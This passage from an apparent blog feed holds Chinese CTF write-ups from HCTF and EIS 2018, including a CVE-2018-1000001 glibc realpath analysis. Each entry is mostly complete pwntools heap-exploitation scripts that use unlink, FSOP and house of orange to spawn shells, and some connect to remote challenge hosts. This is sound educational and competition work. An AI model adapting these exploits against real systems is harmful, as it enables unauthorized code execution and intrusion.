    <content type="text"><![CDATA[本题的关键主要在于通过scanf()调用malloc()申请一个large bin从而触发fastbin的合并获取unsorted bin。当获得了unsorted bin后，就是常规的off by null和house of orange题了。 本题另一麻烦的地方就是在做house of orange时修改unsorted bin的size，需要利用chunk的重叠来实现（在off by null和unlink时，会产生能够利用的指针）。感觉还是tcl，exp写了140行。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146# coding=utf-8from pwn import *def Allocate(p, size, content): p.sendlineafter('Choice:', str(1)) p.sendlineafter('size:', str(size)) p.sendafter('content:', content)def Show(p, idx): p.sendlineafter('Choice:', str(2)) p.sendlineafter('index:', str(idx))def Delete(p, idx): p.sendlineafter('Choice:', str(3)) p.sendlineafter('index: ', str(idx))def pwn(): BIN_PATH = './heapstorm_zero' DEBUG = 1 context.arch = 'amd64' if DEBUG == 1: p = process(BIN_PATH) elf = ELF(BIN_PATH) context.log_level = 'debug' context.terminal = ['tmux', 'split', '-h'] if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6') for i in range(0x19): if i == 7: Allocate(p, 0x33, '\x00' * 0x30 + '\x00\x01\n') elif i == 15: Allocate(p, 0x10, '\n') else: Allocate(p, 0x30, '\n') Allocate(p, 0x10, '\n') Allocate(p, 0x20, '\n') Allocate(p, 0x30, '\n') for i in range(4, 9): Delete(p, i) # 4 5 6 7 8 p.sendline('1' * 0x500) p.recvuntil('Invaild choice!\n') Delete(p, 3) # 3 payload = 'a' * 0x38 Allocate(p, 0x38, payload) # 3 Allocate(p, 0x20, '\n') # 4 Allocate(p, 0x20, '\n') # 5 Allocate(p, 0x20, '\n') # 6 Delete(p, 4) Delete(p, 9) p.sendline('1' * 0x500) p.recvuntil('Invaild choice!\n') Allocate(p, 0x20, '\n') Allocate(p, 0x30, '\n') Allocate(p, 0x20, '\n') Allocate(p, 0x20, '\n') Show(p, 6) p.recvuntil('Content: ') recv = p.recv(6) libc.address = u64(recv + '\x00\x00') - (0x7ffff7dd1b78 - 0x7ffff7a0d000) for i in range(0x15, 0x15+6): Delete(p, i) p.sendline('1' * 0x500) p.recvuntil('Invaild choice!\n') Delete(p, 9) p.sendline('1' * 0x500) p.recvuntil('Invaild choice!\n') Show(p, 5) p.recvuntil('Content: ') recv = p.recv(6) heap_chunk_base = u64(recv + '\x00\x00') - 0x540 Allocate(p, 0x20, '\n') Delete(p, 27) for i in range(11, 21): Delete(p, i) for i in range(0, 4): Delete(p, i) Delete(p, 8) Delete(p, 9) Delete(p, 10) p.sendline('1' * 0x500) p.recvuntil('Invaild choice!\n') # clear the chunk # Attack for i in range(0, 5): Allocate(p, 0x37, 'sunichi\n') Allocate(p, 0x10, 'sunichi\n') for i in range(10): Allocate(p, 0x37, 'sunichi\n') for i in range(0, 4): Delete(p, i) Delete(p, 8) Delete(p, 9) Delete(p, 10) # 10 -&gt; fake file structure Allocate(p, 0x37, 'sunichi!\x31\n') # 10 p.sendline('1' * 0x500) p.recvuntil('Invaild choice!\n') # get unsorted bin # make 0x60 unsorted bin for i in range(4): Allocate(p, 0x37, 'sunichi\n') payload = p64(0) * 4 + p64(0) + p64(0x41) Allocate(p, 0x37, payload + '\n') Delete(p, 5) payload = '/bin/sh\x00' + p64(0x61) payload += p64(libc.address + (0x7ffff7dd1b20 - 0x7ffff7a0d000)) + p64(libc.symbols['_IO_list_all'] - 0x10) payload += p64(0x20) + p64(0x40) Allocate(p, 0x37, payload + '\n') Delete(p, 0) Allocate(p, 0x37, '\x00' * 0x37 + '\n') Delete(p, 11) Allocate(p, 0x37, '\x00' * 0x37 + '\n') Delete(p, 12) payload = p64(0) * 5 + p64(heap_chunk_base + (0x555555757230 - 0x555555756fe0)) Allocate(p, 0x37, payload + '\n') # vtable Delete(p, 13) payload = p64(0) + p64(1) + p64(2) + p64(libc.symbols['system']) Allocate(p, 0x37, payload + '\n') p.sendlineafter('Choice:', str(1)) p.sendlineafter('size:', str(0x17)) p.interactive() p.close()if __name__ == '__main__': pwn()]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>heap</tag>
        <tag>2018</tag>
        <tag>hctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[EIS 2018 pwn writeup]]></title>
    <url>%2F2018%2F11%2F18%2FEIS18-pwn%2F</url>
    <content type="text"><![CDATA[hack思路与pwnable.kr的unlnk一致，通过unlink操作对栈上的值进行修改，从而将栈劫持到堆上，返回到one_gadget处。可以进行两次泄漏，分别泄漏libc地址和栈地址。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556# coding=utf-8from pwn import *def pwn(): BIN_PATH = './hack' DEBUG = 0 context.arch = 'i386' if DEBUG == 1: p = process(BIN_PATH) elf = ELF(BIN_PATH) context.log_level = 'debug' context.terminal = ['tmux', 'split', '-h'] if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6') else: p = remote('210.32.4.16', 13375) elf = ELF(BIN_PATH) libc = ELF('./libc6-i386_2.23-0ubuntu10_amd64.so') context.log_level = 'debug' p.recvuntil('input address: ') p.sendline(str(elf.got['puts'])) p.recvuntil(str(elf.got['puts']) + ', ') recv = p.recvuntil('\n') libc.address = int(recv, 16) - libc.symbols['puts'] print hex(libc.address) p.recvuntil('Second chance: \n') p.sendline(str(libc.symbols['__environ'])) p.recvuntil(', ') recv = p.recvuntil('\n') stack_address = int(recv, 16) print hex(stack_address) raw_input() p.recvuntil('The address of the node is ') recv = p.recvuntil(', ', drop=True) heap_addr = int(recv, 16) target_address = stack_address - (0xffb3d93c - 0xffb3d884) if DEBUG == 1: one_gadget = [0x3ac5c, 0x3ac5e, 0x3ac62, 0x3ac69, 0x5fbc5, 0x5fbc6] else: one_gadget = [0x3a80c, 0x3a80e, 0x3a812, 0x3a819] payload = p32(libc.address + one_gadget[3]) + p32(heap_addr + 12) + p32(heap_addr + 0x4) + p32(target_address - 0x8) p.recvuntil('fake node now: ') p.send(payload) # EIS&#123;d2954e2d38bf6b2ed3ebfead7bb6cd33&#125; p.interactive() p.close()if __name__ == '__main__': pwn() 师兄说本题这个解法是非预期解，看了出题人的思路后，感觉出题人可能忘了libc中能够泄漏栈地址。 justnote程序实现了一般堆题的功能，有Add()、Edit()和Delete()，在Add()中能将用户输入后的chunk内容打印。申请堆块时固定申请0x100，chunk地址和用户输入的长度也保存在堆上，但是保存的地址进行了异或。 初一看没什么问题，后来经师傅提醒，如果输入最大的负数，就能够进行堆溢出： 12345678910111213new_chunk = (__int64)calloc(0x100uLL, 1uLL);if ( !new_chunk )&#123; puts("memory error, contact admin"); exit(1);&#125;printf("length of note: ", 1LL);length = input_num(); // vulnerableif ( length &lt; 0 ) length = -length;if ( length &gt; 0xFF ) length = 0xFFLL;printf("note: "); 随后利用这个堆溢出进行FSOP即可。在写exp的时候利用House Of Orange的方法一直有问题，后来先搞定一个0x60的chunk放入small bin，然后再unsorted bin attack和伪造FILE结构体就没问题了。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112# coding=utf-8from pwn import *def Add(p, length, content): p.sendlineafter('your choice: ', str(1)) p.sendlineafter('length of note: ', str(length)) p.sendlineafter('note: ', content)def Delete(p, idx): p.sendlineafter('your choice: ', str(2)) p.sendlineafter('index of note: ', str(idx))def Edit(p, idx, content): p.sendlineafter('your choice: ', str(3)) p.sendlineafter('index of note: ', str(idx)) p.sendlineafter('note: ', content)def pwn(): BIN_PATH = './justnote' DEBUG = 0 LOCAL_LIBC = 1 context.arch = 'amd64' if DEBUG == 1: p = process(BIN_PATH) elf = ELF(BIN_PATH) context.log_level = 'debug' context.terminal = ['tmux', 'split', '-h'] if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6') else: p = remote('210.32.4.17', 13376) elf = ELF(BIN_PATH) libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') # is same as the remote context.log_level = 'debug' Add(p, 0x20, 'sunichi') Add(p, 0x20, 'sunichi') Add(p, 0x20, 'sunichi') Add(p, 0x20, 'sunichi') Add(p, 0x20, 'sunichi') Add(p, 0x20, 'sunichi') Add(p, 0x20, 'sunichi') Delete(p, 0) Delete(p, 2) payload = 'a' * (0x4440 - 0x4220) Add(p, -9223372036854775808, payload) #0 p.recvuntil(payload) libc_m88_addr = p.recv(6) if LOCAL_LIBC == 1: libc.address = u64(libc_m88_addr.ljust(8, '\x00')) - (0x7f5eae196b78 - 0x7f5eaddd2000) print 'libc base:' + str(hex(libc.address)) payload = 'b' * (0x108) + p64(0x111) + 'b' * (0x108) + p64(0x111) Edit(p, 0, payload) Add(p, 0x20, 'sunichi') #2 Delete(p, 0) Delete(p, 2) Delete(p, 4) payload = 'c' * (0x5575f99b1448 - 0x5575f99b1220) Add(p, -9223372036854775808, payload) #0 p.recvuntil(payload) stack_chunk_4 = p.recv(6) heap_chunk_base = u64(stack_chunk_4.ljust(8, '\x00')) - (0x55ca81101650 - 0x55ca81101210) print 'heap chunk base:' + str(hex(heap_chunk_base)) payload = 'd' * (0x108) + p64(0x111) + 'b' * (0x108) + p64(0x111) + libc_m88_addr + '\x00' * 2 + p64(libc.symbols['_IO_list_all'] - 0x10) Edit(p, 0, payload) payload = 'e' * (0x210) + p64(0) + p64(0x61) + libc_m88_addr + '\x00\x00' + p64(heap_chunk_base + 0x440) Edit(p, 0, payload) Add(p, 0x20, 'sunichi') Add(p, 0x20, 'sunichi') Delete(p, 2) payload = 'f' * 0x430 + p64(0) + p64(0x110) + p64(0) + p64(libc.symbols['_IO_list_all'] - 0x10) Edit(p, 0, payload) payload = 'g' * (0x210) fake_stream = '/bin/sh\x00' + p64(0x61) fake_stream += p64(0) + p64(libc.symbols['_IO_list_all'] - 0x10) fake_stream += p64(heap_chunk_base) + p64(heap_chunk_base + 1) fake_stream = fake_stream.ljust(0xa0, '\x00') fake_stream += p64(heap_chunk_base + 0x300 - 0x10) fake_stream = fake_stream.ljust(0xc0, '\x00') fake_stream += 3 * p64(0) + p64(heap_chunk_base + 0x300 - 0x8) payload += fake_stream payload += p64(2) payload += p64(3) payload += p64(libc.symbols['system']) + p64(0) * 0x20 Edit(p, 0, payload) Add(p, 0x70, 'hack by sunichi') Delete(p, 2) p.interactive() p.close() # EIS&#123;it_is_2018_and_we_still_mess_around_with_note&#125;if __name__ == '__main__': pwn()]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>heap</tag>
        <tag>eis</tag>
        <tag>2018</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CVE–2018-1000001 & hctf 2018 easyexp]]></title>
    <url>%2F2018%2F11%2F16%2Fhctf18-easyexp%2F</url>
    <content type="text"><![CDATA[做题的时候有考虑过CVE，但当时没去查…… CVE–2018-1000001该题思路来源于glibc的CVE–2018-1000001，是一个glibc的缓冲区溢出漏洞，分析后发现能在堆上进行溢出。 以下分析stdlib/canonicalize.c中的__realpath()函数（__canonicalize_file_name仅仅调用__realpath()，没有其它操作）。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197/* Return the canonical absolute name of a given file. Copyright (C) 1996-2016 Free Software Foundation, Inc. This file is part of the GNU C Library. The GNU C Library is free software; you can redistribute it and/or modify it under the terms of the GNU Lesser General Public License as published by the Free Software Foundation; either version 2.1 of the License, or (at your option) any later version. The GNU C Library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU Lesser General Public License for more details. You should have received a copy of the GNU Lesser General Public License along with the GNU C Library; if not, see &lt;http://www.gnu.org/licenses/&gt;. */#include &lt;assert.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#include &lt;limits.h&gt;#include &lt;sys/stat.h&gt;#include &lt;errno.h&gt;#include &lt;stddef.h&gt;#include &lt;eloop-threshold.h&gt;#include &lt;shlib-compat.h&gt;/* Return the canonical absolute name of file NAME. A canonical name does not contain any `.', `..' components nor any repeated path separators ('/') or symlinks. All path components must exist. If RESOLVED is null, the result is malloc'd; otherwise, if the canonical name is PATH_MAX chars or more, returns null with `errno' set to ENAMETOOLONG; if the name fits in fewer than PATH_MAX chars, returns the name in RESOLVED. If the name cannot be resolved and RESOLVED is non-NULL, it contains the path of the first component that cannot be resolved. If the path can be resolved, RESOLVED holds the same value as the value returned. */char *__realpath (const char *name, char *resolved) //name是传入的字符串&#123; char *rpath, *dest, *extra_buf = NULL; const char *start, *end, *rpath_limit; long int path_max; int num_links = 0; // ... // 此部分是常规的一些检查，不影响理解代码逻辑 // ... // 设置path_max参数#ifdef PATH_MAX path_max = PATH_MAX;#else path_max = pathconf (name, _PC_PATH_MAX); if (path_max &lt;= 0) path_max = 1024;#endif if (resolved == NULL) // __canonicalize_file_name默认传参NULL &#123; rpath = malloc (path_max); // 申请保存解析后的路径的chunk，发生溢出的即为该chunk if (rpath == NULL) return NULL; &#125; else rpath = resolved; rpath_limit = rpath + path_max; if (name[0] != '/') &#123; if (!__getcwd (rpath, path_max)) // getcwd返回rpath的地址 &#123; rpath[0] = '\0'; goto error; &#125; dest = __rawmemchr (rpath, '\0'); // dest记录rpath中字符串的结尾 &#125; else &#123; rpath[0] = '/'; dest = rpath + 1; &#125; for (start = end = name; *start; start = end) &#123; struct stat64 st; int n; /* Skip sequence of multiple path-separators. */ while (*start == '/') // 如果以/开头，向后移动 ++start; /* Find end of path component. */ for (end = start; *end &amp;&amp; *end != '/'; ++end) /* Nothing. */; if (end - start == 0) break; else if (end - start == 1 &amp;&amp; start[0] == '.') /* nothing */; else if (end - start == 2 &amp;&amp; start[0] == '.' &amp;&amp; start[1] == '.') &#123; /* Back up to previous component, ignore if at root already. */ // dest初始值为rpath中字符串（getcwd返回值）的结尾 // 如果遇到..，向前搜索/字符，初始情况下：dest = rpath + len &gt; rpath + 1。所以在第一个..时会在while中出现前向溢出 if (dest &gt; rpath + 1) while ((--dest)[-1] != '/'); &#125; else &#123; size_t new_size; if (dest[-1] != '/') *dest++ = '/'; // 在触发漏洞前，dest已经向前溢出，加上len后不会超过rpath_limit if (dest + (end - start) &gt;= rpath_limit) // rpath_limit = rpath + path_max &#123; // ... &#125; // dest为前溢地址，start为路径../../x处的x的地址，即从路径中拷贝第三个片段到dest中 // void *mempcpy（void *dest, const void *src, size_t len) dest = __mempcpy (dest, start, end - start); *dest = '\0'; // __lxstat64可以用来检查rpath指向的文件是否存在，rpath即为(unreachable)/xxxxx if (__lxstat64 (_STAT_VER, rpath, &amp;st) &lt; 0) goto error; if (S_ISLNK (st.st_mode)) &#123; char *buf = __alloca (path_max); size_t len; if (++num_links &gt; __eloop_threshold ()) &#123; __set_errno (ELOOP); goto error; &#125; n = __readlink (rpath, buf, path_max - 1); if (n &lt; 0) goto error; buf[n] = '\0'; if (!extra_buf) extra_buf = __alloca (path_max); len = strlen (end); if ((long int) (n + len) &gt;= path_max) &#123; __set_errno (ENAMETOOLONG); goto error; &#125; /* Careful here, end may be a pointer into extra_buf... */ memmove (&amp;extra_buf[n], end, len + 1); name = end = memcpy (extra_buf, buf, n); if (buf[0] == '/') dest = rpath + 1; /* It's an absolute symlink */ else /* Back up to previous component, ignore if at root already: */ if (dest &gt; rpath + 1) while ((--dest)[-1] != '/'); &#125; else if (!S_ISDIR (st.st_mode) &amp;&amp; *end != '\0') &#123; __set_errno (ENOTDIR); goto error; &#125; &#125; &#125; if (dest &gt; rpath + 1 &amp;&amp; dest[-1] == '/') --dest; *dest = '\0'; assert (resolved == NULL || resolved == rpath); return rpath;error: assert (resolved == NULL || resolved == rpath); if (resolved == NULL) free (rpath); return NULL;&#125;versioned_symbol (libc, __realpath, realpath, GLIBC_2_3);char *__canonicalize_file_name (const char *name)&#123; return __realpath (name, NULL);&#125;weak_alias (__canonicalize_file_name, canonicalize_file_name) 从源代码中可以发现，如果getcwd返回的地址不以/开头的话，就会产生堆的上溢的问题，同时能够向这个上溢的地址写入数据。 easyexp本题的原理即__canonicalize_file_name。在本题中，由于程序变更工作目录后，并没有更新当前目录的根目录，因此getcwd() 会在返回的路径前加上(unreachable)，即getcwd()在本题中返回(unreachable)/tmp。随后为了保证程序正常运行，需要通过__lxstat64()的检查，所以需要保证(unreachable)/tmp存在，故将用户名设置为(unreachable)并在该文件夹下创建名为tmp的文件。 由于存在堆上的前溢且程序构造了堆的使用，因此可以修改chunk的pre_inuse，利用unlink获得shell。 程序创建文件的过程在程序中定义了如下数据结构： 12345struct FILE_CACHE &#123; char *content; int content_length; char filename[84];&#125; 在bss上存在一个FILE_CACHE[3]数组用于保存相关信息。 12345678910111213141516171819202122232425262728293031323334353637383940414243if ( filename )&#123; if ( strstr(filename, "..") || *filename == '/' ) &#123; puts("you can't go out of tmpfs"); &#125; else &#123; for ( i = 0; i &lt;= 2; ++i ) &#123; if ( !strcmp(filename, (const char *)(0x60LL * i + 0x60318C)) ) &#123; printf("write something:"); InputString((__int64)FILE_CACHE[12 * i], (unsigned int)FILE_CACHE[12 * i + 1]); g_idx = (i + 1) % 3; return __readfsqword(0x28u) ^ v8; &#125; &#125; if ( FILE_CACHE[12 * g_idx] ) &#123; s = fopen((const char *)(0x60LL * g_idx + 0x60318C), "w"); fwrite(FILE_CACHE[12 * g_idx], 1uLL, LODWORD(FILE_CACHE[12 * g_idx + 1]), s); fclose(s); free((void *)FILE_CACHE[12 * g_idx]); &#125; strcpy((char *)(0x60LL * g_idx + 0x60318C), filename); fd = open(filename, 131521, 420LL); if ( fd &lt; 0 ) &#123; puts("mkfile:create failed."); exit(-1); &#125; printf("write something:"); InputString((__int64)&amp;buf, 0x1000u); write(fd, &amp;buf, 0x1000uLL); v2 = g_idx; FILE_CACHE[12 * v2] = strdup(&amp;buf); v3 = g_idx; LODWORD(FILE_CACHE[12 * v3 + 1]) = strlen(&amp;buf); close(fd); g_idx = (g_idx + 1) % 3; &#125;&#125; 以上程序位于创建文件的函数中，当用户创建文件时，会现在“缓存”中查找，如果文件名相同或“缓存”未满，则会在“缓存”上保存一份数据，如已满则重置一个“缓存”。这里的结构可以在unlink中进行利用。 程序创建文件夹的过程12345678910111213141516171819for ( i = 0; ; i = *(_DWORD *)v3 + 1 )&#123; *(_QWORD *)&amp;v3[4] = strchr(&amp;a1[i], '/'); if ( *(_QWORD *)&amp;v3[4] ) *(_DWORD *)v3 = *(_DWORD *)&amp;v3[4] - (_DWORD)a1; else *(_QWORD *)v3 = (unsigned int)strlen(a1); snprintf(&amp;path, 0x1000uLL, "%s/%.*s", cur_work_dir, *(unsigned int *)v3, a1); mkdir(&amp;path, 0x1EDu); if ( !a1[*(signed int *)v3] ) break;&#125;ptr = canonicalize_file_name(a1);if ( !ptr )&#123; puts("mkdir:create failed."); exit(-1);&#125;free(ptr); 当程序调用mkdir()函数后，会将用户输入的路径传入canonicalize_file_name()进行验证是否创建成功，此处即为触发漏洞的位置。 利用思路当“缓存”满后，将会重用最后使用的“缓存”的下一个“缓存”。首先将三个“缓存”都填满，第二个缓存内容均为’/‘，利用CVE漏洞改写第三个“缓存”指向的内容的chunk的size域，将size改小（防止和top chunk合并）并布置合适的fake chunk。 随后进行unlink攻击，通过改写“缓存”结构体中的内容指针来泄漏地址和修改__free_hook。 Exp12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667# coding=utf-8from pwn import *def Mkfile(p, filename, content): p.sendlineafter('$', 'mkfile ' + filename) p.sendlineafter('write something:', content)def Mkdir(p, path): p.sendlineafter('$', 'mkdir ' + path)def pwn(): BIN_PATH = './easyexp' DEBUG = 1 context.arch = 'amd64' if DEBUG == 1: p = process(BIN_PATH, env=&#123;'LD_PRELOAD': './libc.so.6'&#125;) elf = ELF(BIN_PATH) context.log_level = 'debug' context.terminal = ['tmux', 'split', '-h'] libc = ELF('./libc.so.6') p.sendlineafter('input your home\'s name: ', '(unreachable)') Mkfile(p, 'hack', 'hack by sunichi') Mkfile(p, '(unreachable)/tmp', '/' * 0x107) Mkfile(p, 'aa', 'a' * (0x90 + 0x20)) Mkdir(p, '../../s\x90') Mkdir(p, '../../\x00') payload = 'a' * 0x88 + p64(0x31) Mkfile(p, 'aa', payload) payload = 'a' * 0x100 + p64(0x100) Mkfile(p, '(unreachable)/tmp', payload) payload = p64(0) + p64(0x101) + p64(0x6031e0 - 0x18) + p64(0x6031e0 - 0x10) Mkfile(p, '(unreachable)/tmp', payload) Mkfile(p, 'bb', 'bb') payload = p64(0) * 3 + p64(0x6031e0) + p64(0x726e752800000100) + p64(0x656c626168636165) + p64(0x000000706d742f29) + p64(0) * 8 + p64(elf.got['free']) + p64(0x0000626200000008) Mkfile(p, '(unreachable)/tmp', payload) p.sendlineafter('$', 'cat bb') p.recvuntil('\x20') recv = p.recvuntil('\x0a\x1b', drop=True) libc.address = u64(recv + '\x00\x00') - libc.symbols['free'] print hex(libc.address) payload = p64(libc.symbols['__free_hook']) + p64(0x726e752800000100) + p64(0x656c626168636165) + p64(0x000000706d742f29) + p64(0) * 8 + p64(next(libc.search('/bin/sh\x00'))) + p64(0x0000626200000008) Mkfile(p, '(unreachable)/tmp', payload) payload = p64(libc.symbols['system']) Mkfile(p, '(unreachable)/tmp', payload) p.sendlineafter('$', 'mkfile getshell') p.interactive() p.close()if __name__ == '__main__': pwn()]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>2018</tag>
        <tag>hctf</tag>
        <tag>libc</tag>
        <tag>cve</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hctf 2018 pwn writeup]]></title>
    <url>%2F2018%2F11%2F12%2Fhctf2018%2F</url>
    <content type="text"><![CDATA[the_end程序自身的功能很简单： 提供libc地址（2.23） 关闭stdout和stderr 5次对所给地址修改1字节的机会 在进行5次修改后，程序调用了exit()函数。一开始的思路是对libc中的FILE结构体进行修改，从而将程序劫持到one_gadget处，但是比赛时想到的方法大概需要10字节左右的修改，放弃。 接着就开始对exit()函数进行研究，在gdb里对exit()函数一步一步地进行跟踪，发现两个能利用的点： 0x00 CTF 2017 left 的解题思路，但是无法获得随机数，放弃。 在_dl_fini函数中，会执行call QWORD PTR [rip+0x216414] #&lt;_rtld_global+3848&gt;，该位置位于ld.so当中，是能够修改的位置。 因此在第二个点的基础上继续研究。通过vmmap可以得知ld.so的这个位置到libc.so.6的基地址的偏移是固定的，虽然他们中间的空间不是连续的（后续再具体研究一下为什么Orz，这题中没问题就对啦）。将该位置的数据修改为one_gadget即可。 另一个需要解决的问题是程序关闭了stdout，所以拿到shell后无法看到服务器的返回。通过exec /bin/sh 1&gt;&amp;0即可对输出流进行重定向，能正常与shell交互。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556# coding=utf-8from pwn import *def pwn(): BIN_PATH = './the_end' DEBUG = 1 local = 1 if DEBUG == 1: if local == 1: p = process(BIN_PATH) else: p = process(BIN_PATH, env=&#123;'LD_PRELOAD': './libc.so.6'&#125;) elf = ELF(BIN_PATH) context.log_level = 'debug' context.terminal = ['tmux', 'split', '-h'] if context.arch == 'amd64': if local == 1: libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('./libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6') else: p = remote('150.109.44.250', 20002) p.recvuntil('Input your token:') p.sendline('8RMQq9PuDRurd91OVhADpDDK30eqjAqz') elf = ELF(BIN_PATH) libc = ELF('./libc.so.6') context.log_level = 'debug' if DEBUG == 1: gdb.attach(p, gdbscript='b *0x0000555555554964') p.recvuntil('here is a gift ') recv = p.recvuntil(',', drop=True) libc.address = int(recv, 16) - libc.symbols['sleep'] print hex(libc.address) one_gadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147] p.recvuntil('luck ;)\n') p.send(p64(libc.address + (0x7ffff7ffdf48 - 0x00007ffff7a0d000))) p.send(p64(libc.address + one_gadget[2])[0]) p.send(p64(libc.address + (0x7ffff7ffdf48 - 0x00007ffff7a0d000) + 1)) p.send(p64(libc.address + one_gadget[2])[1]) p.send(p64(libc.address + (0x7ffff7ffdf48 - 0x00007ffff7a0d000) + 2)) p.send(p64(libc.address + one_gadget[2])[2]) p.send(p64(libc.address + (0x7ffff7ffdf48 - 0x00007ffff7a0d000) + 3)) p.send(p64(libc.address + one_gadget[2])[3]) p.send(p64(libc.address + (0x7ffff7ffdf48 - 0x00007ffff7a0d000) + 4)) p.send(p64(libc.address + one_gadget[2])[4]) # exec /bin/sh 1&gt;&amp;0 p.interactive() p.close()if __name__ == '__main__': pwn() babyprintf_ver2程序本身实现了类似于格式化字符串漏洞的功能，但调用的是printf_chk()函数。用于保存用户输入的字符串的全局变量存在溢出，能够覆盖stdout指针，程序提供了.bss的地址。 因此，通过溢出将stdout指针指回.bss上，并在指向的地方构造虚假的stdout结构体，由于存在着vtable的检查，因此vtable处的值会被程序自己填入。通过构造缓冲区的指针为.bss上的地址，能够将这个vtable的值泄漏出来，从而获得libc的基地址。 同样地，通过构造缓冲区的指针，能够进行任意地址写的操作，将__malloc_hook处修改为one_gadget的地址。通过触发printf_chk()函数的报错进而触发malloc()拿到shell。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172# coding=utf-8from pwn import *def pwn(): BIN_PATH = './babyprintf_ver2' DEBUG = 0 context.arch = 'amd64' if DEBUG == 1: p = process(BIN_PATH) elf = ELF(BIN_PATH) context.log_level = 'debug' context.terminal = ['tmux', 'split', '-h'] if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6') else: p = remote('150.109.44.250', 20005) elf = ELF(BIN_PATH) libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') p.recvuntil('Input your token:') p.sendline('8RMQq9PuDRurd91OVhADpDDK30eqjAqz') context.log_level = 'debug' p.recvuntil('buffer location to') recv = p.recvuntil('\n', drop=True) bss_address = int(recv, 16) p.recvuntil('Have fun!\n') payload = 'a' * 16 + p64(bss_address + 0x20) + p64(0) + p64(0x00000000fbad2884) + p64(bss_address + 0xf8) * 3 payload += p64(bss_address + 0xf8) + p64(bss_address + 0x100) + p64(bss_address + 0x11d) payload += p64(bss_address + 0xf8) + p64(bss_address + 0x11d) + p64(0) * 5 + p64(1) + p64(0xffffffffffffffff) + p64(0x0000000000000000) payload += p64(bss_address + 0x130) + p64(0xffffffffffffffff) + p64(0) * 5 + p64(0x00000000ffffffff) p.sendline(payload) p.recvuntil('permitted!\n') p.sendline('a' * 8) recv = p.recv(8) libc.address = u64(recv) - (0x7ffff7dcc2a0 - 0x7ffff79e4000) print hex(libc.address) payload = 'a' * 16 + p64(bss_address + 0x20) + p64(0) + p64(0x00000000fbad2884) payload += p64(bss_address + 0x200) * 7 payload += p64(bss_address + 0x200) + p64(0) * 5 + p64(1) + p64(0xffffffffffffffff) + p64(0x0000000000000000) payload += p64(bss_address + 0x130) + p64(0xffffffffffffffff) + p64(0) * 5 + p64(0x00000000ffffffff) p.sendline(payload) malloc_hook_addr = libc.symbols['__malloc_hook'] payload = 'a' * 16 + p64(bss_address + 0x20) + p64(0) + p64(0x00000000fbad2884) payload += p64(bss_address + 0x200) * 6 payload += p64(malloc_hook_addr) + p64(malloc_hook_addr + 0x8 + 4) + p64(0) * 5 + p64(1) + p64(0xffffffffffffffff) + p64(0x0000000000000000) payload += p64(bss_address + 0x130) + p64(0xffffffffffffffff) + p64(0) * 5 + p64(0x00000000ffffffff) p.sendline(payload) p.sendline(p64(libc.address + 0x10a38c)) # one_gadget payload = 'a' * 16 + p64(bss_address + 0x20) + p64(0) + p64(0x00000000fbad2884) payload += p64(bss_address + 0x200) * 7 payload += p64(bss_address + 0x200) + p64(0) * 5 + p64(1) + p64(0xffffffffffffffff) + p64(0x0000000000000000) payload += p64(bss_address + 0x130) + p64(0xffffffffffffffff) + p64(0) * 5 + p64(0x00000000ffffffff) p.sendline(payload) sleep(0.5) p.sendline('%49$p') p.interactive() p.close()if __name__ == '__main__': pwn()]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>2018</tag>
        <tag>hctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[0ctf 2017 babyheap]]></title>
    <url>%2F2018%2F07%2F11%2F0ctf17-pwn-babyheap%2F</url>
